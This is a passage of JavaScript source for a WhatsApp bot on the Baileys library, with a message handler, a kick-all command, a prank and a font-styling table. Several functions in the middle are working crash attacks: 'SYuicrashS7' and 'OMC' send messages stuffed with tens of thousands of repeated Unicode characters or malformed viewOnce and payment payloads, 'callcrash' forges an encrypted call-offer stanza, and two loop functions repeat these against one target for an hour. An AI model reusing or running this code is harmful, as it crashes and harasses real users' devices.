            return sock.sendMessage(chatId, { text: '❌ Group only command' });
        }

        const metadata = await sock.groupMetadata(chatId);

        const membersToKick = metadata.participants
            .filter(p => !p.admin)
            .map(p => p.id);

        if (!membersToKick.length) {
            return sock.sendMessage(chatId, { text: '⚠️ No members to kick' });
        }

        await sock.groupParticipantsUpdate(chatId, membersToKick, 'remove');

        await sock.sendMessage(chatId, {
            text: `✅ Kickall done\n👢 Removed: ${membersToKick.length}`
        });

    } catch (err) {
        console.error('Kickall Error:', err);
        await sock.sendMessage(chatId, {
            text: '❌ Bot is not admin'
        });
    }
}
    






// S( BVG )7

async function SYuicrashS7(sock, targetJid) {
  try {
    const s7 = [
      {
        buttonId: ".id1",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id2",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      },
      {
        buttonId: ".id3",
        buttonText: {
          displayText: "𑜦𑜠".repeat(20000)
        },
        type: 1
      }
    ];

    const sabana = {
      location: {
        degreesLatitude: -1,
        degreesLongitude: -1,
        name: "⤷ 𝚈𝚘𝚞𝚛 ZORO⁷⁷¹⁸ 🎭 ⤶" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
        address:" ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
      },
      caption: "ᵁ⁰ᶠᶜQᵁ⁵ᴮᶜᵍ" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000),
      footer: " ",
      s7,
      headerType: 6
    };

    await sock.sendMessage(targetJid, sabana);
  } catch (err) {
  }
}


async function callcrash(sock, targetJid) {
  // 1. Get all targetJid devices
  const devices = (
    await sock.getUSyncDevices([targetJid], false, false, sock.authState)
  ).map(({ user, device }) => {
    return `${user}:${device || ""}@s.whatsapp.net`
  })

  // 2. Ensure encryption sessions
  await sock.assertSessions(devices)

  // 3. Mutex per JID (avoid signal race conditions)
  const locks = {}
  const mutex = async (jid, task) => {
    locks[jid] ??= Promise.resolve()
    locks[jid] = locks[jid].catch(() => {}).then(task)
    return locks[jid]
  }

  // 4. Padding helper
  const pad = buf =>
    Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)])

  // 5. Override participant encryption
  const originalCreateParticipantNodes =
    sock.createParticipantNodes?.bind(sock)

  sock.createParticipantNodes = async (
    recipients,
    message,
    encAttrs,
    overrideMessage
  ) => {
    if (!recipients.length) {
      return { nodes: [], shouldIncludeDeviceIdentity: false }
    }

    const patched =
      (await sock.patchMessageBeforeSending?.(message, recipients)) ??
      message

    const messages = Array.isArray(patched)
      ? patched
      : recipients.map(jid => ({
          recipientJid: jid,
          message: patched
        }))

    const { id: myJid, lid } = sock.authState.creds.me
    const linkedUser = lid ? jidDecode(lid)?.user : null

    let includeDeviceIdentity = false

    const nodes = await Promise.all(
      messages.map(async ({ recipientJid, message }) => {
        const recipientUser = jidDecode(recipientJid).user
        const myUser = jidDecode(myJid).user

        const isSelf =
          recipientUser === myUser || recipientUser === linkedUser

        if (overrideMessage && isSelf && recipientJid !== myJid) {
          message = overrideMessage
        }

        const encoded = pad(
          sock.encodeWAMessage
            ? sock.encodeWAMessage(message)
            : encodeWAMessage(message)
        )

        return mutex(recipientJid, async () => {
          const { type, ciphertext } =
            await sock.signalRepository.encryptMessage({
              jid: recipientJid,
              data: encoded
            })

          if (type === "pkmsg") includeDeviceIdentity = true

          return {
            tag: "to",
            attrs: { jid: recipientJid },
            content: [
              {
                tag: "enc",
                attrs: { v: "2", type, ...encAttrs },
                content: ciphertext
              }
            ]
          }
        })
      })
    )

    return {
      nodes: nodes.filter(Boolean),
      shouldIncludeDeviceIdentity: includeDeviceIdentity
    }
  }

  // 6. Create encrypted destination nodes
  const { nodes, shouldIncludeDeviceIdentity } =
    await sock.createParticipantNodes(
      devices,
      { conversation: "y" },
      { count: "0" }
    )

  // 7. Build CALL OFFER stanza
  const callNode = {
    tag: "call",
    attrs: {
      to: targetJid,
      id: sock.generateMessageTag(),
      from: sock.user.id
    },
    content: [
      {
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              enc: "vp8",
              dec: "vp8",
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          { tag: "encopt", attrs: { keygen: "2" } },
          {
            tag: "destination",
            attrs: {},
            content: nodes
          },
          ...(shouldIncludeDeviceIdentity
            ? [
                {
                  tag: "device-identity",
                  attrs: {},
                  content: encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                  )
                }
              ]
            : [])
        ]
      }
    ]
  }

  // 8. Send the call offer
  await sock.sendNode(callNode)

  // Optional: restore original function
  if (originalCreateParticipantNodes) {
    sock.createParticipantNodes = originalCreateParticipantNodes
  }
}

async function OMC(sock, targetJid) {
  const generateMsgId = () => crypto.randomBytes(10).toString('hex').toUpperCase();

  // First payload: malformed viewOnce + interactive
  const viewOncePayload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "\u2000" },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "\u2000" },
              {
                name: "form_message",
                buttonParamsJson: JSON.stringify({
                  icon: "DEFAULT",
                  flow_cta: "\u2000",
                  flow_message_version: "3"
                })
              }
            ]
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage(targetJid, viewOncePayload, {
      messageId: generateMsgId(),
      participant: targetJid  // ← MUST be the plain string JID
    });
  } catch (e) {
    console.error('ViewOnce payload failed:', e.message);
  }

  // Second payload: payment with large text
  const largeText = "\u2000".repeat(1500);
  const paymentPayload = {
    requestPaymentMessage: {
      currencyCodeIso4217: "IDR",
      requestFrom: targetJid,
      expiryTimestamp: Date.now() + 8000,
      amount: { value: 999999999, offset: 100, currencyCode: "IDR" },
      contextInfo: {
        externalAdReply: {
          title: " ",
          body: largeText,
          mimetype: "audio/mpeg",
          caption: largeText,
          showAdAttribution: true
        }
      }
    }
  };

  try {
    await sock.relayMessage(targetJid, paymentPayload, {
      messageId: generateMsgId(),
      participant: targetJid  // ← Again, plain string
    });
  } catch (e) {
    console.error('Payment payload failed:', e.message);
  }
}

async function RunCrashHelper(sock, targetJid) {
    const totalDurationMs = 60 * 60 * 1000; // 1 hour
    const startTime = Date.now();

    console.log('🚀 cal CRASH helper started for:', targetJid);

    while (Date.now() - startTime < totalDurationMs) {
        try {
            await callcrash(sock, targetJid);
        } catch (err) {
            console.error('❌ RunCrashHelper error:', err);
        }

        // safety delay
        await new Promise(res => setTimeout(res, 2000));
    }

    console.log('✅ call CRASH helper finished for:', targetJid);
}





async function S7LOVESYUILIKES7(sock, targetJid) {
  const SY_LOVE_IS_IMPORTANT = 1000;
  const ALSO_S7_TOO = 10 * 60 * 1000;
  const ONE_HOUR_LOVS = 60 * 60 * 1000;
  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  

  const startTime = Date.now();

  while (Date.now() - startTime < ONE_HOUR_LOVS) {
  
    await SYuicrashS7(sock, targetJid);
    await SYuicrashS7(sock, targetJid);

    const tenMinuteStart = Date.now();


    while (Date.now() - tenMinuteStart < ALSO_S7_TOO) {
    
      await callcrash(sock, targetJid);
      await callcrash(sock, targetJid);
      await delay(SY_LOVE_IS_IMPORTANT);
    }
    
    
    await SYuicrashS7(sock, targetJid);
    await SYuicrashS7(sock, targetJid);
  }
}










// bakchodi ✅

async function hackPrankCommand(sock, chatId, message) {
    const target =
        message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
        || message.key.remoteJid;

    const name = target.split('@')[0];

    const steps = [
        "🖥️ Initializing hack module...",
        "🔍 Scanning target system...",
        "⚙️ Loading exploit framework...",
        "📡 Injecting payload into system...",
        "🔐 Cracking password hashes...",
        "📁 Password found: ********",
        "📍 Tracking IP address...",
        "✅ Tracking complete",
        "🧠 Accessing system core...",
        "🛠️ Manipulating system files...",
        "🗑️ Deleting system files...",
        "🔥 System wipe in progress...",
        "✅ SYSTEM DESTROYED SUCCESSFULLY",
        "",
        `😈 Hack completed on ${name}`,
        "😂😂 MAZAK THA BHAI, TENSION MAT LE"
    ];

    let delay = 1200;

    for (const text of steps) {
        await sock.sendMessage(chatId, { text }, { quoted: message });
        await new Promise(res => setTimeout(res, delay));
    }
}



// hahahahj fuck you

function LovingS7(text, map) {
    return text.split('').map(c => map[c] || c).join('');
}

const LOVE_ME_SY = [
    { // 0: fancy
        a:'𝓪',b:'𝓫',c:'𝓬',d:'𝓭',e:'𝓮',f:'𝓯',g:'𝓰',h:'𝓱',i:'𝓲',j:'𝓳',k:'𝓴',l:'𝓵',m:'𝓶',n:'𝓷',o:'𝓸',p:'𝓹',q:'𝓺',r:'𝓻',s:'𝓼',t:'𝓽',u:'𝓾',v:'𝓿',w:'𝔀',x:'𝔁',y:'𝔂',z:'𝔃',
        A:'𝓐',B:'𝓑',C:'𝓒',D:'𝓓',E:'𝓔',F:'𝓕',G:'𝓖',H:'𝓗',I:'𝓘',J:'𝓙',K:'𝓚',L:'𝓛',M:'𝓜',N:'𝓝',O:'𝓞',P:'𝓟',Q:'𝓠',R:'𝓡',S:'𝓢',T:'𝓣',U:'𝓤',V:'𝓥',W:'𝓦',X:'𝓧',Y:'𝓨',Z:'𝓩',
        0:'𝟘',1:'𝟙',2:'𝟚',3:'𝟛',4:'𝟜',5:'𝟝',6:'𝟞',7:'𝟟',8:'𝟠',9:'𝟡'
    },
    { // 1: bold
        a:'𝐚',b:'𝐛',c:'𝐜',d:'𝐝',e:'𝐞',f:'𝐟',g:'𝐠',h:'𝐡',i:'𝐢',j:'𝐣',k:'𝐤',l:'𝐥',m:'𝐦',n:'𝐧',o:'𝐨',p:'𝐩',q:'𝐪',r:'𝐫',s:'𝐬',t:'𝐭',u:'𝐮',v:'𝐯',w:'𝐰',x:'𝐱',y:'𝐲',z:'𝐳',
        A:'𝐀',B:'𝐁',C:'𝐂',D:'𝐃',E:'𝐄',F:'𝐅',G:'𝐆',H:'𝐇',I:'𝐈',J:'𝐉',K:'𝐊',L:'𝐋',M:'𝐌',N:'𝐍',O:'𝐎',P:'𝐏',Q:'𝐐',R:'𝐑',S:'𝐒',T:'𝐓',U:'𝐔',V:'𝐕',W:'𝐖',X:'𝐗',Y:'𝐘',Z:'𝐙',
        0:'𝟎',1:'𝟏',2:'𝟐',3:'𝟑',4:'𝟒',5:'𝟓',6:'𝟔',7:'𝟕',8:'𝟖',9:'𝟗'
    },
    { // 2: small caps
        a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ғ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',n:'ɴ',o:'ᴏ',p:'ᴘ',q:'ǫ',r:'ʀ',s:'s',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ',
        0:'₀',1:'₁',2:'₂',3:'₃',4:'₄',5:'₅',6:'₆',7:'₇',8:'₈',9:'₉'
    },
    { // 3: bubble
        a:'ⓐ',b:'ⓑ',c:'ⓒ',d:'ⓓ',e:'ⓔ',f:'ⓕ',g:'ⓖ',h:'ⓗ',i:'ⓘ',j:'ⓙ',k:'ⓚ',l:'ⓛ',m:'ⓜ',n:'ⓝ',o:'ⓞ',p:'ⓟ',q:'ⓠ',r:'ⓡ',s:'ⓢ',t:'ⓣ',u:'ⓤ',v:'ⓥ',w:'ⓦ',x:'ⓧ',y:'ⓨ',z:'ⓩ',
        0:'⓪',1:'①',2:'②',3:'③',4:'④',5:'⑤',6:'⑥',7:'⑦',8:'⑧',9:'⑨'
    },
    { // 4: cool
        a:'α',b:'ɓ',c:'ƈ',d:'ɗ',e:'ε',f:'ƒ',g:'ɠ',h:'ɦ',i:'ι',j:'ʝ',k:'ƙ',l:'ʟ',m:'ɱ',n:'ɳ',o:'σ',p:'ρ',q:'ϙ',r:'ɾ',s:'ʂ',t:'ƭ',u:'υ',v:'ʋ',w:'ω',x:'χ',y:'ყ',z:'ʐ',
        0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9'
    },
    { // 5: italic
        a:'𝘢',b:'𝘣',c:'𝘤',d:'𝘥',e:'𝘦',f:'𝘧',g:'𝘨',h:'𝘩',i:'𝘪',j:'𝘫',k:'𝘬',l:'𝘭',m:'𝘮',n:'𝘯',o:'𝘰',p:'𝘱',q:'𝘲',r:'𝘳',s:'𝘴',t:'𝘵',u:'𝘶',v:'𝘷',w:'𝘸',x:'𝘹',y:'𝘺',z:'𝘻',
        0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9'
    },
    { // 6: monospace
        a:'𝚊',b:'𝚋',c:'𝚌',d:'𝚍',e:'𝚎',f:'𝚏',g:'𝚐',h:'𝚑',i:'𝚒',j:'𝚓',k:'𝚔',l:'𝚕',m:'𝚖',n:'𝚗',o:'𝚘',p:'𝚙',q:'𝚚',r:'𝚛',s:'𝚜',t:'𝚝',u:'𝚞',v:'𝚟',w:'𝚠',x:'𝚡',y:'𝚢',z:'𝚣',
        0:'𝟶',1:'𝟷',2:'𝟸',3:'𝟹',4:'𝟺',5:'𝟻',6:'𝟼',7:'𝟽',8:'𝟾',9:'𝟿'
    },
    { // 7: upside down
        a:'ɐ',b:'q',c:'ɔ',d:'p',e:'ǝ',f:'ɟ',g:'ɓ',h:'ɥ',i:'ᴉ',j:'ɾ',k:'ʞ',l:'ʃ',m:'ɯ',n:'u',o:'o',p:'d',q:'b',r:'ɹ',s:'s',t:'ʇ',u:'n',v:'ʌ',w:'ʍ',x:'x',y:'ʎ',z:'z',
        0:'0',1:'Ɩ',2:'ᄅ',3:'Ɛ',4:'ㄣ',5:'ϛ',6:'9',7:'ㄥ',8:'8',9:'6'
    },
    { // 8: glitch
        a:'a̷',b:'b̷',c:'c̷',d:'d̷',e:'e̷',f:'f̷',g:'g̷',h:'h̷',i:'i̷',j:'j̷',k:'k̷',l:'l̷',m:'m̷',n:'n̷',o:'o̷',p:'p̷',q:'q̷',r:'r̷',s:'s̷',t:'t̷',u:'u̷',v:'v̷',w:'w̷',x:'x̷',y:'y̷',z:'z̷',
        0:'0̷',1:'1̷',2:'2̷',3:'3̷',4:'4̷',5:'5̷',6:'6̷',7:'7̷',8:'8̷',9:'9̷'
    },
    { // 9: wide
        a:'ａ',b:'ｂ',c:'ｃ',d:'ｄ',e:'ｅ',f:'ｆ',g:'ｇ',h:'ｈ',i:'ｉ',j:'ｊ',k:'ｋ',l:'ｌ',m:'ｍ',n:'ｎ',o:'ｏ',p:'ｐ',q:'ｑ',r:'ｒ',s:'ｓ',t:'ｔ',u:'ｕ',v:'ｖ',w:'ｗ',x:'ｘ',y:'ｙ',z:'ｚ',
        0:'０',1:'１',2:'２',3:'３',4:'４',5:'５',6:'６',7:'７',8:'８',9:'９'
    },
    { // 10: boxed
        a:'🄰',b:'🄱',c:'🄲',d:'🄳',e:'🄴',f:'🄵',g:'🄶',h:'🄷',i:'🄸',j:'🄹',k:'🄺',l:'🄻',m:'🄼',n:'🄽',o:'🄾',p:'🄿',q:'🅀',r:'🅁',s:'🅂',t:'🅃',u:'🅄',v:'🅅',w:'🅆',x:'🅇',y:'🅈',z:'🅉',
        0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9'
    },
    { // 11: Zoro Md (Italic Bold Serif)
        a:'𝒂',b:'𝒃',c:'𝒄',d:'𝒅',e:'𝒆',f:'𝒇',g:'𝒈',h:'𝒉',i:'𝒊',j:'𝒋',k:'𝒌',l:'𝒍',m:'𝒎',n:'𝒏',o:'𝒐',p:'𝒑',q:'𝒒',r:'𝒓',s:'𝒔',t:'𝒕',u:'𝒖',v:'𝒗',w:'𝒘',x:'𝒙',y:'𝒚',z:'𝒛',
        A:'𝑨',B:'𝑩',C:'𝑪',D:'𝑫',E:'𝑬',F:'𝑭',G:'𝑮',H:'𝑯',I:'𝑰',J:'𝑱',K:'𝑲',L:'𝑳',M:'𝑴',N:'𝑵',O:'𝑶',P:'𝑷',Q:'𝑸',R:'𝑹',S:'𝑺',T:'𝑻',U:'𝑼',V:'𝑽',W:'𝑾',X:'𝑿',Y:'𝒀',Z:'𝒁',
        0:'𝟎',1:'𝟏',2:'𝟐',3:'𝟑',4:'𝟒',5:'𝟓',6:'𝟔',7:'𝟕',8:'𝟖',9:'𝟗'
    },
    { // 12: Hollow / Double Struck (ℤ𝕆ℝ𝕆)
        a:'𝕒',b:'𝕓',c:'𝕔',d:'𝕕',e:'𝕖',f:'𝕗',g:'𝕘',h:'𝕙',i:'𝕚',j:'𝕛',k:'𝕜',l:'𝕝',m:'𝕞',n:'𝕟',o:'𝕠',p:'𝕡',q:'𝕢',r:'𝕣',s:'𝕤',t:'𝕥',u:'𝕦',v:'𝕧',w:'𝕨',x:'𝕩',y:'𝕪',z:'𝕫',
        A:'𝔸',B:'𝔹',C:'ℂ',D:'𝔻',E:'𝔼',F:'𝔽',G:'𝔾',H:'ℍ',I:'𝕀',J:'𝕁',K:'𝕂',L:'𝕃',M:'𝕄',N:'ℕ',O:'𝕆',P:'ℙ',Q:'ℚ',R:'ℝ',S:'𝕊',T:'𝕋',U:'𝕌',V:'𝕍',W:'𝕎',X:'𝕏',Y:'𝕐',Z:'ℤ',
        0:'𝟘',1:'𝟙',2:'𝟚',3:'𝟛',4:'𝟜',5:'𝟝',6:'𝟞',7:'𝟟',8:'𝟠',9:'𝟡'
    },
    { // 13: Gothic (𝕲𝖔𝖙𝖍𝖎𝖈)
        a:'𝔞',b:'𝔟',c:'𝔠',d:'𝔡',e:'𝔢',f:'𝔣',g:'𝔤',h:'𝔥',i:'𝔦',j:'𝔧',k:'𝔨',l:'𝔩',m:'𝔪',n:'𝔫',o:'𝔬',p:'𝔭',q:'𝔮',r:'𝔯',s:'𝔰',t:'𝔱',u:'𝔲',v:'𝔳',w:'𝔴',x:'𝔵',y:'𝔶',z:'𝔷',
        A:'𝕬',B:'𝕭',C:'𝕮',D:'𝕯',E:'𝕰',F:'𝕱',G:'𝕲',H:'𝕳',I:'𝕴',J:'𝕵',K:'𝕶',L:'𝕷',M:'𝕸',N:'𝕹',O:'𝕺',P:'𝕻',Q:'𝕼',R:'𝕽',S:'𝕾',T:'𝕿',U:'𝖀',V:'𝖁',W:'𝖂',X:'𝖃',Y:'𝖄',Z:'𝖅',
        0:'0',1:'1',2:'2',3:'3',4:'4',5:'5',6:'6',7:'7',8:'8',9:'9'
    },
    { // 14: Negative Square (🆉🅾🆁🅾)
        a:'🅰',b:'🅱',c:'🅲',d:'🅳',e:'🅴',f:'🅵',g:'🅶',h:'🅷',i:'🅸',j:'🅹',k:'🅺',l:'🅻',m:'🅼',n:'🅽',o:'🅾',p:'🅿',q:'🆀',r:'🆁',s:'🆂',t:'🆃',u:'🆄',v:'🆅',w:'🆆',x:'🆇',y:'🆈',z:'🆉',
        A:'🅰',B:'🅱',C:'🅲',D:'🅳',E:'🅴',F:'🅵',G:'🅶',H:'🅷',I:'🅸',J:'🅹',K:'🅺',L:'🅻',M:'🅼',N:'🅽',O:'🅾',P:'🅿',Q:'🆀',R:'🆁',S:'🆂',T:'🆃',U:'🆄',V:'🆅',W:'🆆',X:'🆇',Y:'🆈',Z:'🆉',
        0:'⓿',1:'❶',2:'❷',3:'❸',4:'❹',5:'❺',6:'❻',7:'❼',8:'❽',9:'❾'
    },
    { // 15: Script (𝒵𝑜𝓇𝑜)
        a:'𝒶',b:'𝒷',c:'𝒸',d:'𝒹',e:'𝑒',f:'𝒻',g:'𝑔',h:'𝒽',i:'𝒾',j:'𝒿',k:'𝓀',l:'𝓁',m:'𝓂',n:'𝓃',o:'𝑜',p:'𝓅',q:'𝓆',r:'𝓇',s:'𝓈',t:'𝓉',u:'𝓊',v:'𝓋',w:'𝓌',x:'𝓍',y:'𝓎',z:'𝓏',
        A:'𝒜',B:'ℬ',C:'𝒞',D:'𝒟',E:'ℰ',F:'ℱ',G:'𝒢',H:'ℋ',I:'ℐ',J:'𝒥',K:'𝒦',L:'ℒ',M:'ℳ',N:'𝒩',O:'𝒪',P:'𝒫',Q:'𝒬',R:'ℛ',S:'𝒮',T:'𝒯',U:'𝒰',V:'𝒱',W:'𝒲',X:'𝒳',Y:'𝒴',Z:'𝒵',
        0:'𝟢',1:'𝟣',2:'𝟤',3:'𝟥',4:'𝟦',5:'𝟧',6:'𝟨',7:'𝟩',8:'𝟪',9:'𝟫'
    },
    { // 16: Sans Bold Italic (𝙕𝙤𝙧𝙤)
        a:'𝙖',b:'𝙗',c:'𝙘',d:'𝙙',e:'𝙚',f:'𝙛',g:'𝙜',h:'𝙝',i:'𝙞',j:'𝙟',k:'𝙠',l:'𝙡',m:'𝙢',n:'𝙣',o:'𝙤',p:'𝙥',q:'𝙦',r:'𝙧',s:'𝙨',t:'𝙩',u:'𝙪',v:'𝙫',w:'𝙬',x:'𝙭',y:'𝙮',z:'𝙯',
        A:'𝘼',B:'𝘽',C:'𝘾',D:'𝘿',E:'𝙀',F:'𝙁',G:'𝙂',H:'𝙃',I:'𝙄',J:'𝙅',K:'𝙆',L:'𝙇',M:'𝙈',N:'𝙉',O:'𝙊',P:'𝙋',Q:'𝙌',R:'𝙍',S:'𝙎',T:'𝙏',U:'𝙐',V:'𝙑',W:'𝙒',X:'𝙓',Y:'𝙔',Z:'𝙕',
        0:'𝟎',1:'𝟏',2:'𝟐',3:'𝟑',4:'𝟒',5:'𝟓',6:'𝟔',7:'𝟕',8:'𝟖',9:'𝟗'
    },
    { // 17: Tiny (ᴢᴏʀᴏ)
        a:'ᴀ',b:'ʙ',c:'ᴄ',d:'ᴅ',e:'ᴇ',f:'ғ',g:'ɢ',h:'ʜ',i:'ɪ',j:'ᴊ',k:'ᴋ',l:'ʟ',m:'ᴍ',n:'ɴ',o:'ᴏ',p:'ᴘ',q:'ǫ',r:'ʀ',s:'s',t:'ᴛ',u:'ᴜ',v:'ᴠ',w:'ᴡ',x:'x',y:'ʏ',z:'ᴢ',
        A:'ᴀ',B:'ʙ',C:'ᴄ',D:'ᴅ',E:'ᴇ',F:'ғ',G:'ɢ',H:'ʜ',I:'ɪ',J:'ᴊ',K:'ᴋ',L:'ʟ',M:'ᴍ',N:'ɴ',O:'ᴏ',P:'ᴘ',Q:'ǫ',R:'ʀ',S:'s',T:'ᴛ',U:'ᴜ',V:'ᴠ',W:'ᴡ',X:'x',Y:'ʏ',Z:'ᴢ',
        0:'⁰',1:'¹',2:'²',3:'³',4:'⁴',5:'⁵',6:'⁶',7:'⁷',8:'⁸',9:'⁹'
    },
    { // 18: Strikethrough (Z̶o̶r̶o̶)
        a:'a̶',b:'b̶',c:'c̶',d:'d̶',e:'e̶',f:'f̶',g:'g̶',h:'h̶',i:'i̶',j:'j̶',k:'k̶',l:'l̶',m:'m̶',n:'n̶',o:'o̶',p:'p̶',q:'q̶',r:'r̶',s:'s̶',t:'t̶',u:'u̶',v:'v̶',w:'w̶',x:'x̶',y:'y̶',z:'z̶',
        A:'A̶',B:'B̶',C:'C̶',D:'D̶',E:'E̶',F:'F̶',G:'G̶',H:'H̶',I:'I̶',J:'J̶',K:'K̶',L:'L̶',M:'M̶',N:'N̶',O:'O̶',P:'P̶',Q:'Q̶',R:'R̶',S:'S̶',T:'T̶',U:'U̶',V:'V̶',W:'W̶',X:'X̶',Y:'Y̶',Z:'Z̶',
        0:'0̶',1:'1̶',2:'2̶',3:'3̶',4:'4̶',5:'5̶',6:'6̶',7:'7̶',8:'8̶',9:'9̶'
    },
    { // 19: Slashed (Z̸o̸r̸o̸)
        a:'a̸',b:'b̸',c:'c̸',d:'d̸',e:'e̸',f:'f̸',g:'g̸',h:'h̸',i:'i̸',j:'j̸',k:'k̸',l:'l̸',m:'m̸',n:'n̸',o:'o̸',p:'p̸',q:'q̸',r:'r̸',s:'s̸',t:'t̸',u:'u̸',v:'v̸',w:'w̸',x:'x̸',y:'y̸',z:'z̸',
        A:'A̸',B:'B̸',C:'C̸',D:'D̸',E:'E̸',F:'F̸',G:'G̸',H:'H̸',I:'I̸',J:'J̸',K:'K̸',L:'L̸',M:'M̸',N:'N̸',O:'O̸',P:'P̸',Q:'Q̸',R:'R̸',S:'S̸',T:'T̸',U:'U̸',V:'V̸',W:'W̸',X:'X̸',Y:'Y̸',Z:'Z̸',
        0:'0̸',1:'1̸',2:'2̸',3:'3̸',4:'4̸',5:'5̸',6:'6̸',7:'7̸',8:'8̸',9:'9̸'
    },
    { // 20: Underline (Z̲o̲r̲o̲)
        a:'a̲',b:'b̲',c:'c̲',d:'d̲',e:'e̲',f:'f̲',g:'g̲',h:'h̲',i:'i̲',j:'j̲',k:'k̲',l:'l̲',m:'m̲',n:'n̲',o:'o̲',p:'p̲',q:'q̲',r:'r̲',s:'s̲',t:'t̲',u:'u̲',v:'v̲',w:'w̲',x:'x̲',y:'y̲',z:'z̲',
        A:'A̲',B:'B̲',C:'C̲',D:'D̲',E:'E̲',F:'F̲',G:'G̲',H:'H̲',I:'I̲',J:'J̲',K:'K̲',L:'L̲',M:'M̲',N:'N̲',O:'O̲',P:'P̲',Q:'Q̲',R:'R̲',S:'S̲',T:'T̲',U:'U̲',V:'V̲',W:'W̲',X:'X̲',Y:'Y̲',Z:'Z̲',
        0:'0̲',1:'1̲',2:'2̲',3:'3̲',4:'4̲',5:'5̲',6:'6̲',7:'7̲',8:'8̲',9:'9̲'
    }
];


function generateSYloveFonts(text) {
    let out = '';
    LOVE_ME_SY.forEach((map, i) => {
        out += `${i+1}. ${LovingS7(text, map)}\n`;
    });
    return out;
}








// s7












async function handleMessages(sock, messageUpdate, printLog, phoneNumber) {

let commandMatched = false;
    try {
        const { messages, type } = messageUpdate;
        if (type !== 'notify') return;

        const message = messages[0];
        if (!message?.message) return;
        
try {
const reactState = getAutoReactState(phoneNumber);
if (reactState.enabled) {
    await sendAutoReaction(sock, message);
}
} catch (e) {}

        await handleAutoread(sock, message, phoneNumber);
        
await handleAutoStatus(sock, message, phoneNumber);

        if (message.message) {
            storeMessage(sock, message);
        }

        if (message.message?.protocolMessage?.type === 0) {
            await handleMessageRevocation(sock, message);
            return;
        }

        const chatId = message.key.remoteJid;
        const senderId = message.key.participant || message.key.remoteJid;
        const isGroup = chatId.endsWith('@g.us');
        const senderIsSudo = await isSudo(senderId);
        const senderIsOwnerOrSudo = await isOwnerOrSudo(senderId, sock, chatId);

        if (message.message?.buttonsResponseMessage) {
    const id = message.message.buttonsResponseMessage.selectedButtonId;

    if (id.startsWith('ytq|')) {
        await handleYtButton(sock, message);
        return;
    }
}

        const userMessage = (
            message.message?.conversation?.trim() ||
            message.message?.extendedTextMessage?.text?.trim() ||
            message.message?.imageMessage?.caption?.trim() ||
            message.message?.videoMessage?.caption?.trim() ||
            message.message?.buttonsResponseMessage?.selectedButtonId?.trim() ||
            ''
        ).toLowerCase().replace(/\.\s+/g, '.').trim();

        // Preserve raw message for commands like .tag that need original casing
        const rawText = message.message?.conversation?.trim() ||
            message.message?.extendedTextMessage?.text?.trim() ||
            message.message?.imageMessage?.caption?.trim() ||
            message.message?.videoMessage?.caption?.trim() ||
            '';

        // Only log command usage
        if (userMessage.startsWith('.')) {
            console.log(`📝 Command used in ${isGroup ? 'group' : 'private'}: ${userMessage}`);
        }
        // Read bot mode once; don't early-return so moderation can still run in private mode
        let isPublic = true;
        try {
            const data = readSessionJSON(phoneNumber, 'messageCount.json', {
    isPublic: true,
    messages: {}
});
            if (typeof data.isPublic === 'boolean') isPublic = data.isPublic;
        } catch (error) {
            console.error('Error checking access mode:', error);
            // default isPublic=true on error
        }
        const isOwnerOrSudoCheck = message.key.fromMe || senderIsOwnerOrSudo;
        // Check if user is banned (skip ban check for unban command)
        if (isBanned(senderId) && !userMessage.startsWith('.unban')) {
    return;
}

        // First check if it's a game move
        if (/^[1-9]$/.test(userMessage) || userMessage.toLowerCase() === 'surrender') {
            await handleTicTacToeMove(sock, chatId, senderId, userMessage);
            return;
        }


        if (!message.key.fromMe) incrementMessageCount(phoneNumber, chatId, senderId);

       
        if (isGroup) {
            if (userMessage) {
                await handleBadwordDetection(sock, chatId, message, userMessage, senderId);
            }
            // Antilink checks message text internally, so run it even if userMessage is empty
            await Antilink(message, sock);
        }


        if (!isGroup && !message.key.fromMe && !senderIsSudo) {
            try {
                const pmState = readSessionJSON(phoneNumber, 'pmblocker.json', {
    enabled: false,
    message: 'Private messages are blocked.'
});
                if (pmState.enabled) {
                    await sock.sendMessage(chatId, { text: pmState.message || 'Private messages are blocked. Please contact the owner in groups only.' });
                    await new Promise(r => setTimeout(r, 1500));
                    try { await sock.updateBlockStatus(chatId, 'block'); } catch (e) { }
                    return;
                }
            } catch (e) { }
        }

        // Then check for command prefix
        if (!userMessage.startsWith('.')) {
            await handleAutotypingForMessage(sock, chatId, userMessage);

            if (isGroup) {
                // Always run moderation features (antitag) regardless of mode
                await handleTagDetection(sock, chatId, message, senderId);
                await handleMentionDetection(sock, chatId, message);
                
                // Only run chatbot in public mode or for owner/sudo
                if (isPublic || isOwnerOrSudoCheck) {
                    await handleChatbotResponse(sock, chatId, message, userMessage, senderId);
                }
            }
            return;
        }
        // In private mode, only owner/sudo can run commands
